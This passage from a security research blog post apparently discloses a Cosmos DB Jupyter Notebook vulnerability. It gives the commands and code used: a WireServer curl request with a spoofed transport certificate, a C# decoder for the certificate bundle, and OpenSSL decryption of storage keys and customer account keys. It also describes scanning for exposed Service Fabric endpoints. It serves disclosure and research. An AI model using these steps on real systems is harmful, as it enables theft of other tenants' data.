</p><p>Our VM had several configured extensions, including:</p><p><em> 1. Microsoft. Azure. Security. Dsms. Dsms For Windows  </em></p><p>These extensions were most likely installed on our HOST, the Windows-based VM, and not our private Linux container. The next logical step was to extract information from these configurations and maybe uncover secrets we could later use for lateral movement within the Cosmos DB environment.</p><p><strong>Retrieving decryption keys</strong></p><p>Most extensions contain these two sections:  </p><p> 1. <em>publicSettings</em><strong> </strong>– plain-text section holding generic information about the VM extension and settings.  </p><p>Hardcoded credentials and/or sensitive info are supposed to be stored in the <em>protectedSettings </em>section of our extensions. So how does the agent decrypt this sensitive data? Where does it get the decryption key? The answer is the Certificates endpoint. But to retrieve the certificates for the decryption, the agent first needs to take an extra precaution and supply a self-signed transport certificate that would be used to encrypt the certificates bundle. Fortunately, this transport certificate is not validated by the server, meaning we can supply our own without relying on any certificate that has been previously generated by the host machine’s agent. The way to supply this public key is by including it in the <em>x-ms-guest-agent-public-x509-cert</em> header. </p><p>
-- CODE language-bash line-numbers --
root@notebook:/home/cosmosuser# curl -s -H &#39;x-ms-agent-name: WALinuxAgent&#39; -H &#39;x-ms-version: 2012-11-30&#39; &#34;http://168.63.129.16:80/machine/82daf2f0-1c7a-45e5-9be6-&lt;REDACTED&gt;/f2a6f11f-ad20-4bb3-839f-&lt;REDACTED&gt;._CV2FI02_0?comp=certificates&amp;incarnation=19&amp;type=fullConfig&#34; -v -H &#39;x-ms-cipher-name: DES_EDE3_CBC&#39; -H &#39;x-ms-guest-agent-public-x509-cert: MIIDDTCCAf&lt;REDACTED&gt;VILecKTmgDgpm9K0=&#39; 
*   Trying 168.63.129.16... 
* TCP_NODELAY set 
* Connected to 168.63.129.16 (168.63.129.16) port 80 (#0) 
&gt; GET /machine/82daf2f0-1c7a-45e5-9be6-&lt;REDACTED&gt;/f2a6f11f-ad20-4bb3-839f-&lt;REDACTED&gt;._CV2FI02_0?comp=certificates&amp;incarnation=19&amp;type=fullConfig HTTP/1.1 
&gt; Host: 168.63.129.16 
&gt; User-Agent: curl/7.58.0 
&gt; Accept: */* 
&gt; x-ms-agent-name: WALinuxAgent 
&gt; x-ms-version: 2012-11-30 
&gt; x-ms-cipher-name: DES_EDE3_CBC 
&gt; x-ms-guest-agent-public-x509-cert: MIIDDTCCAf … redacted … ILecKTmgDgpm9K0= 
&gt;  
&lt; HTTP/1.1 200 OK 
&lt; Content-Type: text/xml; charset=utf-8 
&lt; Server: Microsoft-IIS/10.0 
&lt; Date: Mon, 09 Aug 2021 15:14:13 GMT 
&lt; Content-Length: 218769 
&lt;  
{ [14133 bytes data] 
* Connection #0 to host 168.63.129.16 left intact 
&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt; 
&lt;CertificateFile xmlns:xsi=&#34;http://www.w3.org/2001/XMLSchema-instance&#34; xsi:noNamespaceSchemaLocation=&#34;certificates10.xsd&#34;&gt; 
  &lt;Version&gt;2012-11-30&lt;/Version&gt; 
  &lt;Incarnation&gt;19&lt;/Incarnation&gt; 
  &lt;Format&gt;CertificatesBondPackage&lt;/Format&gt; 
  &lt;Data&gt;Cw7XFjCCC1MGCSqGSIb3DQEHA6CCC0QwggtAAgECMYIBMDCCASwCAQKAFHLFPtEz 
NkHq9EbPS1vv8Xh+51+XMA0GCSqGSIb3DQEBAQUABIIBADsYzJwqOmvP154ZphyM 
... redacted ... 
RCwBXbsdtTLSR9I4LtD+gdwyah617jzV/OeBHRnDJELqYzmpUgRSAG8AbwB0AAAA 
&lt;/Data&gt; 
&lt;/CertificateFile&gt; 
</p><p>To this point, every time we queried the Certificates endpoint (in any other service), we always retrieved the certificates encoded in the <em>Pkcs7BlobWithPfxContents </em>format, as can be seen in figure below. This is the certificate bundle, encrypted in a way that only the private key that matches the public key supplied in the<em> x-ms-guest-agent-public-x509-cert</em> header can decrypt.</p><figure><p><img src="https://assets-global.website-files.com/618c4feaba62b4d2da5cade6/618c4feaba62b4e9585cb0af_image10.png" loading="lazy" alt=""/></p><figcaption>Pkcs7BlobWithPfxContents format</figcaption></figure><p>However, when we performed the exact same steps on the Jupyter Notebook environment, we retrieved the certificates encoded in another format – <em>Certificates Bond Package</em>.</p><figure><p><img src="https://assets-global.website-files.com/618c4feaba62b4d2da5cade6/618c4feaba62b4ec785cb0b0_image11.png" loading="lazy" alt=""/></p><figcaption>Certificates Bond Package format</figcaption></figure><p>This is the first time we’d ever encountered this format. Unfortunately, the OpenSSL commands that we are used to executing to decrypt the standard format did not work here. Time to up our game and try to decode this format!</p><h4>Decoding Certificates Bond Package</h4><p>Our search for the Certificate Bond Package format on Google did not yield an answer:</p><figure><p><img src="https://assets-global.website-files.com/618c4feaba62b4d2da5cade6/618c4feaba62b4ff195cb0b1_image12.png" loading="lazy" alt=""/></p><figcaption>Google results for Certificates Bond Package</figcaption></figure><p>Where do we go from here? We decided to reverse engineer the clients of the WireServer, the VM agents. We assumed that if anything knew how to decode this format, it would be these agents that rely on this information to function properly.</p><p>Looking at the Linux agent first, we could not find any reference to the mysterious Certificate Bond Package format.</p><figure><p><img src="https://assets-global.website-files.com/618c4feaba62b4d2da5cade6/618c4feaba62b48a545cb0b2_image13.png" loading="lazy" alt=""/></p><figcaption>WALinuxAgent GitHub repo results for Certificates Bond Package</figcaption></figure><p>Moving on to investigate the Windows agent, we knew that according to the IMDS metadata service, even though we were running inside a Linux container, our host VM was a Windows VM. This means that all responses from the WireServer are meant to be treated by the Windows agent, not the Linux one. And this was the breakthrough we needed to continue.  </p><p>Unlike the WA-Agent, the Windows virtual machine agent (also known as the <em>Windows Azure Guest Agent.exe</em>), is not open-source. But it is written in C#, so we could decompile it into something that resembles source code fairly easily. There are a number of tools out there that can do this—we chose  ILSpy. </p><p>Here is the ILSpy view of <em>Microsoft. WindowsAzure. RoleContainer.dll</em>, part of Windows Azure Guest Agent.exe:</p><figure><p><img src="https://assets-global.website-files.com/618c4feaba62b4d2da5cade6/618c4feaba62b4df8b5cb0b3_image14.png" loading="lazy" alt=""/></p><figcaption>ILSpy view of Microsoft. WindowsAzure. RoleContainer.dll, part of Windows Azure Guest Agent.exe</figcaption></figure><p><em>Followed by the ILSpy view of Microsoft.WindowsAzure.Security.CredentialsManagement.Package.dll</em>, part of WindowsAzureGuestAgent.exe:</p><figure><p><img src="https://assets-global.website-files.com/618c4feaba62b4d2da5cade6/618c4feaba62b481895cb0b4_image15.png" loading="lazy" alt=""/></p><figcaption>ILSpy view of Microsoft. WindowsAzure. Security. Credentials Management. Package.dll, part of Windows Azure Guest Agent.exe</figcaption></figure><p>And there you have it! Finally, we have our first reference to the elusive CertificatesBondPackage format, along with its handling code.   </p><p>Using existing functionalities of the Windows Agent, we wrote a simple snippet that mimics the agent’s decoding of the Certificates Bond Package, in order to obtain the keys in the familiar <em>pkcs7 </em>file format.</p><p>
-- CODE language-bash line-numbers --
using Microsoft.Cis.Fabric.CertificateServices; 
using Microsoft.WindowsAzure.GuestAgent.CertificateManager; 
using Microsoft.WindowsAzure.Security.CredentialsManagement.Package; 
using System; 
using System.Collections.Generic; 
using System.IO; 
using System.Linq; 
using System.Security.Cryptography.X509Certificates; 
using System.Text; 
using System.Threading.Tasks; 
using Bond.IO; 
using Bond.IO.Unsafe; 
using RD.Security.Dsms; 
using Bond; 
using Bond.Protocols; 
namespace ConsoleApp2 
{ 
    class Program 
    { 
        static void Main(string[] args) 
        { 
            byte[] cert = File.ReadAllBytes(@&#34;cerificate_bond.bin&#34;); 
            InputBuffer input = new InputBuffer(cert); 
            ManagedCertificatesPackage managedCertsData = Deserialize&lt;SecretsPackage&gt;.From(new CompactBinaryReader&lt;InputBuffer&gt;(input, 1)).ManagedCertsPackage; 
            var managedCertData = managedCertsData.CertsData; 
            byte[] array = new byte[managedCertData.Count]; 
            Array.Copy(managedCertData.Array, managedCertData.Offset, array, 0, managedCertData.Count); 
            byte[] data = array; 
            File.WriteAllBytes(@&#34;ManagedCertsPackage.bin&#34;, data); 
            InputBuffer input2 = new InputBuffer(cert); 
            ArraySegment&lt;byte&gt; unmanagedCertsData = Deserialize&lt;SecretsPackage&gt;.From(new CompactBinaryReader&lt;InputBuffer&gt;(input2, 1)).UnmanagedCertsData; 
            var unmanagedCertData = unmanagedCertsData; 
            byte[] array2 = new byte[unmanagedCertData.Count]; 
            Array.Copy(unmanagedCertData.Array, unmanagedCertData.Offset, array2, 0, unmanagedCertData.Count); 
            byte[] data2 = array2; 
            File.WriteAllBytes(@&#34;UnmanagedCertsData.bin&#34;, data2); 
        } 
    } 
} 
</p><p>Now, after decoding and decrypting the Certificate Bond Package, we expected to get two keys: a private key and a public key used to encrypt and decrypt the protected settings.  </p><p><strong>In reality, we got back 25 keys.   </strong></p><p>Yes, 25 Microsoft certificates AND their corresponding private keys. <a href="https://ctt.ac/53r5f" target="_blank"> Click to tweet this!</a> </p><p>
-- CODE language-bash line-numbers --
user@laptop:~/cosmos$ grep subject ManagedCertificates.pem 
subject=CN = fabricsecrets.documents.azure.com 
subject=CN = secrets-kek.documents.azure.com 
subject=CN = computev2.internal.by.cosmos.azure.com 
subject=CN = fe.internal-secrets.by.cosmos.azure.com 
subject=CN = computev2.internal.by.cosmos.azure.com 
subject=CN = fabric.westus1.cosmos.azure.com 
subject=CN = computev2tomanagement.internal.cosmos.azure.com 
subject=CN = metricsclient.geneva.core.windows.net 
subject=CN = fe.internal-secrets.by.cosmos.azure.com 
subject=CN = *.notebook.cosmos.azure.com 
subject=CN = metricsclient.geneva.core.windows.net 
subject=CN = fabric.westus1.cosmos.azure.com 
subject=CN = /certificates/selfsigned/agentidcert/crpcustomers/services/vmss/by5prdapp04_f2a6f11f-ad20-4bb3-839f-&lt;REDACTED&gt;_wf/by5prdapp04_f2a6f11f-ad20-4bb3-839f-&lt;REDACTED&gt;-by5prdapp04-f2a6f11f-ad20-4bb3-839f-&lt;REDACTED&gt;--/crpcustomers/services/vmss/by5prdapp04_f2a6f11f-ad20-4bb3-839f-&lt;REDACTED&gt;_wf/by5prdapp04_f2a6f11f-ad20-4bb3-839f-&lt;REDACTED&gt;--by5prdapp04.fc.core.windows.net--f2a6f11f-ad20-4bb3-839f-&lt;REDACTED&gt;--uswest-dsms.dsms.core.windows.net 
subject=CN = *.notebook.cosmos.azure.com 
subject=CN = computev2tomanagement.internal.cosmos.azure.com 
subject=CN = fabric.westus1.cosmos.azure.com 
subject=CN = fabricsecrets.documents.azure.com 
subject=CN = secrets-kek.documents.azure.com 
subject=CN = fabricsecrets.documents.azure.com 
subject=CN = computev2tomanagement.internal.cosmos.azure.com 
subject=CN = secrets-kek.documents.azure.com 
subject=CN = *.notebook.cosmos.azure.com 
subject=CN = computev2.internal.by.cosmos.azure.com 
subject=CN = fe.internal-secrets.by.cosmos.azure.com 
subject=CN = metricsclient.geneva.core.windows.net 
user@laptop:~/cosmos$ grep subject UnmanagedCertificates.pem 
subject=DC = Windows Azure CRP Certificate Generator 
</p><p>The Certificates Bond Package contained a bunch of certificates we probably shouldn’t have had; we will take a closer look at these 3:  </p><p>1. <em>fabricsecrets. documents. azure.com</em> </p><p> What is the legitimate purpose for these certificates?</p><h4>Accessing Storage Accounts and Internal Service Fabric </h4><p>Going back to ExtensionConfig, we realized the ServiceFabricNode extension had some interesting information in its public settings: it contained the cluster endpoint for the machine’s Service Fabric cluster, along with the common name of the certificate required for authentication:</p><p>
-- CODE language-bash line-numbers --
&#34;publicSettings&#34;: {&#34;clusterEndpoint&#34;:&#34;https://westus.servicefabric.azure.com/runtime/clusters/83bd67e7-7bb1-4f4f-826f-&lt;REDACTED&gt;&#34;, ...snip... ,&#34;certificate&#34;:{&#34;commonNames&#34;:[&#34;fabric.westus1.cosmos.azure.com&#34;],&#34;x509StoreName&#34;:&#34;My&#34;}}   
</p><p>When we accessed the <em>clusterEndpoint </em>URL from Google Chrome, we were prompted to supply a client certificate for authentication. We concluded that our best bet would be to use the <em>fabric. westus1. cosmos. azure.com</em> certificate we obtained earlier from WireServer, since  it was mentioned in the publicSettings of the ServiceFabricNodeExtension.</p><figure><p><img src="https://assets-global.website-files.com/618c4feaba62b4d2da5cade6/618c4feaba62b438175cb0b5_image16.png" loading="lazy" alt=""/></p><figcaption>Google Chrome prompting to supply a certificate</figcaption></figure><p>What we got back was a huge XML formatted manifest file with lots of cluster information, including multiple connection-strings to multiple Azure Storage Accounts that can be accessed with the Storage Account Key found in the decrypted protectedSettings section of our ExtensionConfig: </p><p>
-- CODE language-xml line-numbers --
&lt;Section Name=&#34;AzureBlobServiceFabricCrashDump&#34;&gt;  
&lt;Parameter Name=&#34;ConsumerType&#34; Value=&#34;AzureBlobFolderUploader&#34;/&gt;  
&lt;Parameter Name=&#34;ContainerName&#34; Value=&#34;fabriccrashdumps-83bd67e7-7bb1-4f4f-826f-&lt;REDACTED&gt;&#34;/&gt;  
&lt;Parameter Name=&#34;DataDeletionAgeInDays&#34; Value=&#34;28&#34;/&gt;  
&lt;Parameter Name=&#34;IsEnabled&#34; Value=&#34;true&#34;/&gt;  
&lt;Parameter Name=&#34;ProducerInstance&#34; Value=&#34;ServiceFabricCrashDump&#34;/&gt;  
&lt;Parameter Name=&#34;StoreConnectionString&#34; Value=&#34;xstore:BlobEndpoint=https://kssf2q&lt;REDACTED&gt;.blob.core.windows.net/;TableEndpoint=https://kssf2q&lt;REDACTED&gt;.table.core.windows.net/;AccountName=kssf2q&lt;REDACTED&gt;;ProtectedAccountKeyName=StorageAccountKey1&#34;/&gt;  
&lt;/Section&gt;  
&lt;Section Name=&#34;AzureBlobServiceFabricEtw&#34;&gt;  
&lt;Parameter Name=&#34;ConsumerType&#34; Value=&#34;AzureBlobEtwCsvUploader&#34;/&gt;  
&lt;Parameter Name=&#34;ContainerName&#34; Value=&#34;fabriclogs-83bd67e7-7bb1-4f4f-826f-&lt;REDACTED&gt;&#34;/&gt;  
&lt;Parameter Name=&#34;DataDeletionAgeInDays&#34; Value=&#34;28&#34;/&gt;  
&lt;Parameter Name=&#34;IsEnabled&#34; Value=&#34;true&#34;/&gt;  
&lt;Parameter Name=&#34;ProducerInstance&#34; Value=&#34;ServiceFabricEtlFile&#34;/&gt;  
&lt;Parameter Name=&#34;StoreConnectionString&#34; Value=&#34;xstore:BlobEndpoint=https://kssf2q&lt;REDACTED&gt;.blob.core.windows.net/;TableEndpoint=https://kssf2q&lt;REDACTED&gt;.table.core.windows.net/;AccountName=kssf2q&lt;REDACTED&gt;;ProtectedAccountKeyName=StorageAccountKey1&#34;/&gt;  
&lt;/Section&gt;  
&lt;Section Name=&#34;AzureBlobServiceFabricPerfCounter&#34;&gt;  
&lt;Parameter Name=&#34;ConsumerType&#34; Value=&#34;AzureBlobFolderUploader&#34;/&gt;  
&lt;Parameter Name=&#34;ContainerName&#34; Value=&#34;fabriccounters-83bd67e7-7bb1-4f4f-826f-&lt;REDACTED&gt;&#34;/&gt;  
&lt;Parameter Name=&#34;DataDeletionAgeInDays&#34; Value=&#34;28&#34;/&gt;  
&lt;Parameter Name=&#34;IsEnabled&#34; Value=&#34;true&#34;/&gt;  
&lt;Parameter Name=&#34;ProducerInstance&#34; Value=&#34;ServiceFabricPerfCounter&#34;/&gt;  
&lt;Parameter Name=&#34;StoreConnectionString&#34; Value=&#34;xstore:BlobEndpoint=https://kssf2q&lt;REDACTED&gt;.blob.core.windows.net/;TableEndpoint=https://kssf2q&lt;REDACTED&gt;.table.core.windows.net/;AccountName=kssf2q&lt;REDACTED&gt;;ProtectedAccountKeyName=StorageAccountKey1&#34;/&gt;  
&lt;/Section&gt;  
&lt;Section Name=&#34;AzureTableServiceFabricEtwQueryable&#34;&gt;  
&lt;Parameter Name=&#34;ConsumerType&#34; Value=&#34;AzureTableQueryableEventUploader&#34;/&gt;  
&lt;Parameter Name=&#34;DataDeletionAgeInDays&#34; Value=&#34;28&#34;/&gt;  
&lt;Parameter Name=&#34;IsEnabled&#34; Value=&#34;true&#34;/&gt;  
&lt;Parameter Name=&#34;ProducerInstance&#34; Value=&#34;ServiceFabricEtlFileQueryable&#34;/&gt;  
&lt;Parameter Name=&#34;StoreConnectionString&#34; Value=&#34;xstore:BlobEndpoint=https://kssf2q&lt;REDACTED&gt;.blob.core.windows.net/;TableEndpoint=https://kssf2q&lt;REDACTED&gt;.table.core.windows.net/;AccountName=kssf2q&lt;REDACTED&gt;;ProtectedAccountKeyName=StorageAccountKey1&#34;/&gt;  
&lt;Parameter Name=&#34;TableNamePrefix&#34; Value=&#34;fabriclog83bd67e77bb14f4f826f&lt;REDACTED&gt;&#34;/&gt;  
&lt;/Section&gt;
</p><p>For future reference, these are the OpenSSL commands we used to decrypt the protectedSettings section:</p><p>
-- CODE language-bash line-numbers --
user@laptop:~/cosmos$ ls -la 
total 144 
drwxr-xr-x 2 user user   4096 Aug  9 20:37 . 
drwxr-xr-x 3 user user   4096 Aug  9 19:53 .. 
-rw------- 1 user user 121900 Aug  9 18:32 ManagedCertificates.pem 
-rw------- 1 user user   3144 Aug  9 18:35 UnmanagedCertificates.pem 
user@laptop:~/cosmos$ cat UnmanagedCertificates.pem | sed -n &#39;/-----BEGIN PRIVATE KEY-----$/,/^-----END PRIVATE KEY-----$/p&#39; &gt; protected-key.pem 
user@laptop:~/cosmos$ cat UnmanagedCertificates.pem | sed -n &#39;/-----BEGIN CERTIFICATE-----$/,/^-----END CERTIFICATE-----$/p&#39; &gt; protected-cert.pem 
user@laptop:~/cosmos$ echo MIIB0AYJKoZIhvcN...redacted...pqF8om/4fhhMgqGpu | base64 -d | openssl smime -inform DER -decrypt -recip protected-cert.pem -inkey protected-key.pem 
{&#34;Placeholder&#34;:&#34;NothingImportant&#34;} 
user@laptop:~/cosmos$ echo MIICkwYJKoZIhvcN...redacted...pMd+kxSTnWwJLOwgl | base64 -d | openssl smime -inform DER -decrypt -recip protected-cert.pem -inkey protected-key.pem 
{&#34;StorageAccountKey1&#34;:&#34;55410uWV0y5X...redacted...XCUEN2upGg==&#34;,&#34;StorageAccountKey2&#34;:&#34;kNY61/TqYr4r...redacted...KOvBat3NbQ==&#34;} 
</p><p>‍</p><figure><p><img src="https://assets-global.website-files.com/618c4feaba62b4d2da5cade6/618c4feaba62b449625cb0b6_image17.png" loading="lazy" alt=""/></p><figcaption>Accessing the Azure Storage Accounts using Azure Storage Explorer</figcaption></figure><p>We then noticed this section in the manifest.xml file that describes the Service Fabric nodes:</p><p>
-- CODE language-xml line-numbers --
&lt;NodeTypeName=&#34;CV2FI02&#34;&gt; 
&lt;Endpoints&gt; 
&lt;ClientConnectionEndpointPort=&#34;19000&#34;/&gt; 
&lt;LeaseDriverEndpointPort=&#34;1026&#34;/&gt; 
&lt;ClusterConnectionEndpointPort=&#34;1025&#34;/&gt; 
&lt;HttpGatewayEndpointPort=&#34;19080&#34;Protocol=&#34;https&#34;/&gt; 
&lt;ServiceConnectionEndpointPort=&#34;1027&#34;/&gt; 
&lt;ApplicationEndpointsStartPort=&#34;20000&#34;EndPort=&#34;30000&#34;/&gt; 
&lt;EphemeralEndpointsStartPort=&#34;30001&#34;EndPort=&#34;65534&#34;/&gt; 
&lt;/Endpoints&gt; 
&lt;Certificates&gt; 
&lt;ClusterCertificateX509FindType=&#34;FindBySubjectName&#34;X509FindValue=&#34;fabric.westus1.cosmos.azure.com&#34;Name=&#34;Certificate&#34;/&gt; 
&lt;ServerCertificateX509FindType=&#34;FindBySubjectName&#34;X509FindValue=&#34;fabric.westus1.cosmos.azure.com&#34;Name=&#34;Certificate&#34;/&gt; 
&lt;ClientCertificateX509FindType=&#34;FindBySubjectName&#34;X509FindValue=&#34;fabric.westus1.cosmos.azure.com&#34;Name=&#34;Certificate&#34;/&gt; 
&lt;/Certificates&gt; 
&lt;PlacementProperties&gt; 
&lt;PropertyName=&#34;JanusGraphCapable&#34;Value=&#34;true&#34;/&gt; 
&lt;PropertyName=&#34;MaterializedViewsBuilderCapable&#34;Value=&#34;true&#34;/&gt; 
&lt;PropertyName=&#34;NodeTypeName&#34;Value=&#34;CV2FI02&#34;/&gt; 
&lt;PropertyName=&#34;NotebookCapable&#34;Value=&#34;true&#34;/&gt; 
&lt;PropertyName=&#34;RingRoleName&#34;Value=&#34;CV2FI&#34;/&gt; 
&lt;/PlacementProperties&gt; 
&lt;Capacities&gt; 
&lt;CapacityName=&#34;ComputeUnits&#34;Value=&#34;80&#34;/&gt; 
&lt;CapacityName=&#34;ServiceFabric:/_CpuCores&#34;Value=&#34;80&#34;/&gt; 
&lt;CapacityName=&#34;ServiceFabric:/_MemoryInMB&#34;Value=&#34;442367&#34;/&gt; 
&lt;/Capacities&gt; 
&lt;/NodeType&gt; 
&lt;/NodeTypes&gt; 
&lt;Infrastructure&gt; 
&lt;PaaS&gt; 
&lt;Roles&gt; 
&lt;RoleRoleName=&#34;CV2CB01&#34;NodeTypeRef=&#34;CV2CB01&#34;RoleNodeCount=&#34;5&#34;/&gt; 
&lt;RoleRoleName=&#34;CV2CW02&#34;NodeTypeRef=&#34;CV2CW02&#34;RoleNodeCount=&#34;7&#34;/&gt; 
&lt;RoleRoleName=&#34;CV2FI02&#34;NodeTypeRef=&#34;CV2FI02&#34;RoleNodeCount=&#34;8&#34;/&gt; 
&lt;/Roles&gt; 
&lt;Votes&gt; 
&lt;VoteNodeName=&#34;_CV2FI02_0&#34;IPAddressOrFQDN=&#34;10.0.0.4&#34;Port=&#34;1025&#34;/&gt; 
&lt;VoteNodeName=&#34;_CV2FI02_1&#34;IPAddressOrFQDN=&#34;10.0.0.5&#34;Port=&#34;1025&#34;/&gt; 
&lt;VoteNodeName=&#34;_CV2FI02_2&#34;IPAddressOrFQDN=&#34;10.0.0.6&#34;Port=&#34;1025&#34;/&gt; 
&lt;VoteNodeName=&#34;_CV2FI02_3&#34;IPAddressOrFQDN=&#34;10.0.0.7&#34;Port=&#34;1025&#34;/&gt; 
&lt;VoteNodeName=&#34;_CV2FI02_4&#34;IPAddressOrFQDN=&#34;10.0.0.8&#34;Port=&#34;1025&#34;/&gt; 
&lt;VoteNodeName=&#34;_CV2FI02_5&#34;IPAddressOrFQDN=&#34;10.0.0.9&#34;Port=&#34;1025&#34;/&gt; 
&lt;VoteNodeName=&#34;_CV2FI02_6&#34;IPAddressOrFQDN=&#34;10.0.0.10&#34;Port=&#34;1025&#34;/&gt; 
&lt;/Votes&gt; 
&lt;/PaaS&gt; 
&lt;/Infrastructure&gt; 
</p><p>If you’ve been paying close attention so far, you’d recall that our jailbreak included removing local firewall rules from the iptables that prevented us from accessing the 10.0.0.0/16 subnet, which we see in the manifest file above. This means, we could now access it freely. This also means we could access the local Service Fabric HttpGatewayEndpoint on port 19080 from our Jupyter Notebook container, which, as the manifest file suggests, could be authenticated using fabric. westus1. cosmos. azure. com. </p><p>Now would be a good time to pause and ask, what is the Service Fabric anyway? According to <a href="https://docs.microsoft.com/en-us/azure/service-fabric/" target="_blank">Microsoft’s documentation</a>, Azure Service Fabric is a distributed systems platform that makes it easy to package, deploy, and manage scalable and reliable microservices and containers. So, we can treat it as an alternative to Kubernetes. Good.</p><h4>Listing the applications </h4><p>We connected and authenticated to our local Service Fabric on port 19080 with the fabric.westus1.cosmos.azure.com certificate, using the <a href="https://pypi.org/project/sfctl/" target="_blank">sfctl </a>command line. We then used the  <em>sfctl application list</em> command in order to list the running application instances.  </p><p>The output gave us a list of all Cosmos DB instances (more than 500!) that were managed by this regional cluster, including those that do not belong to our account:</p><figure><p><img src="https://assets-global.website-files.com/618c4feaba62b4d2da5cade6/618c4feaba62b459a35cb0b7_image18.png" loading="lazy" alt=""/></p><figcaption>sfctl application list output</figcaption></figure><p>Going over the output of the executed command, we thought these fields were particularly interesting: </p><p> 1. COSMOSDB_ ACCOUNT_ KEY_ENCRYPTED </p><p>Even though these secrets were encrypted (as their name suggests), we had the certificate required for decryption: fabricsecrets.documents.azure.com.  These are the commands used in order to decrypt the secrets using the fabricsecrets. documents. azure.com certificate:</p><p>
-- CODE language-bash line-numbers --
user@laptop:~/cosmos$ cat msg.p7m 
MIME-Version:1.0 
Content-Disposition: attachment; filename=&#34;./msg.p7m&#34; 
Content-Type: application/x-pkcs7-mime; name=&#34;./msg.p7m&#34; 
Content-Transfer-Encoding: base64 
MIICOgYJKoZIhvcNAQcDoIIC...redacted...6oYVI1iUIj9cS2K9JEQEvY1/A== // &lt;--- COSMOSDB_ACCOUNT_KEY_ENCRYPTED 
user@laptop:~/cosmos$ openssl cms -decrypt -in msg.p7m -inkey ./fabricsecrets.documents.azure.com.key -recip ./fabricsecrets.documents.azure.com.crt 
EuFBNZOWMFIee...redacted...0G7W4iDZoQeCQQ== // &lt;--- Plain-text for COSMOSDB_ACCOUNT_KEY_ENCRYPTED  
</p><h4>Impact</h4><p>Using the information we obtained by taking advantage of the misconfigurations described above, we were able to:  </p><p>1. Obtain the plaintext Primary Key for any Cosmos DB instance running in our cluster, granting us the ability to query and manipulate customers’ databases without any authorization.  </p><p>2. Obtain the plaintext auth token for any Jupyter Notebook instance running in our cluster, granting us the ability to execute arbitrary code on customers’ Jupyter VMs without any authorization.  </p><p>3. Obtain plaintext passwords for customers’ notebook storage accounts, granting us the ability to access and manipulate customers’ private saved notebooks.  </p><p>4. Obtain the certificate for <em>*.notebook. cosmos. azure.com</em>, granting us the ability to intercept SSL traffic to these endpoints.  </p><p>5. Obtain metadata about the underlying infrastructure of Cosmos DB by accessing internal Azure storage blobs.  </p><p>6. Access the underlying infrastructure of Cosmos DB by browsing to Service Fabric Explorer located on various endpoints and authenticating with <em>fabric. westus1. cosmos. azure.com</em>.  </p><figure><p><img src="https://assets-global.website-files.com/618c4feaba62b4d2da5cade6/618c4feaba62b45c535cb0b8_image19.png" loading="lazy" alt=""/></p><figcaption>Accessing customers’ Notebook Storage using NOTEBOOK_ STORAGE_ ACCOUNT_ KEY_ ENCRYPTED</figcaption></figure><figure><p><img src="https://assets-global.website-files.com/618c4feaba62b4d2da5cade6/618c4feaba62b454cc5cb0b9_image20.png" loading="lazy" alt=""/></p><figcaption>Executing code on Notebook VM using NOTEBOOK_ AUTH_ TOKEN_ ENCRYPTED</figcaption></figure><h4>Demo</h4><figure><p><iframe allowfullscreen="true" frameborder="0" scrolling="no" src="https://www.youtube.com/embed/yNGKqG7hefI"></iframe></p></figure><h4>Accessing the Infrastructure Externally</h4><p>We mentioned earlier multiple Azure Storage Accounts that we think contained metadata information about the underlying infrastructure of Cosmos DB. After reviewing these log files, we noticed that some of them contained information about public Service Fabrics that were supposedly accessible from the internet (compared to the LAN access that was required earlier).  </p><p>We performed a network scan for port 19080 on Microsoft’s ASN and found 100+ instances of Service Fabric that were accessible via this port. We attempted to connect to each of these Service Fabric using the certificate we obtained earlier (<em>fabric. westus1. cosmos. azure.com</em>) and to our surprise, the authentication was successful!  </p><p>Using just one certificate, we managed to authenticate to internal Service Fabric instances of multiple regions that were accessible from the internet.,</p><figure><p><img src="https://assets-global.website-files.com/618c4feaba62b4d2da5cade6/618c4feaba62b40b735cb0a6_image21.png" loading="lazy" alt=""/></p><figcaption>Web-UI of Internet-accessible Service Fabric</figcaption></figure><p>And a partial list of Service Fabric instances that were found in our network scan:</p><figure><p><img src="https://assets-global.website-files.com/618c4feaba62b4d2da5cade6/618c4feaba62b449065cb0ba_image22.png" loading="lazy" alt=""/></p><figcaption>Partial list of Service Fabric instances that were found in our network scan</figcaption></figure><h4>Conclusion</h4><p>We managed to gain unauthorized access to customers’ Azure Cosmos DB instances by taking advantage of a chain of misconfigurations in the Jupyter Notebook Container feature of Cosmos DB. We were able to prove access to thousands of companies’ Cosmos DB Instances (database, notebook environment, notebook storage) with full admin control via multiple authentication tokens and API keys. Among the affected customers are many Fortune 500 companies. We also managed to gain access to the underlying infrastructure that runs Cosmos DB and we were able to prove that this access can be maintained outside of the vulnerable application—over the internet. Overall, we think that this is as close as it gets to a “Service Takeover”.</p><h4>Disclosure Timeline</h4><p>August 09 2021 - Wiz Research Team first exploited the bug and gained unauthorized access to Cosmos DB accounts. </p><h4>Stay in touch!</h4><p>Hi there! We are Nir Ohfeld and Sagi Tzadik from the Wiz Research Team. We are both veteran BlackHat speakers, white-hat hackers, but first and foremost two very good friends who in their spare time save the world from Cloud Vulnerabilities 😊 A little about us: Nir has been recently ranked 3rd on the <a href="https://msrc-blog.microsoft.com/2021/10/14/congratulations-to-the-top-msrc-2021-q3-security-researchers/" target="_blank">MSRC 2021 Q3 Research Researcher Leaderboard</a>, while Sagi is constantly coming up with new ideas and endless creativity when it comes to game-hacking and reverse-engineering.  </p><figure><p><img src="https://assets-global.website-files.com/618c4feaba62b4d2da5cade6/618c4feaba62b4b44c5cb0bb_IMG_0136.jpg" loading="lazy" alt=""/></p></figure><p>We’d love to hear from you!  </p></div></div></div>
  </body>
</html>
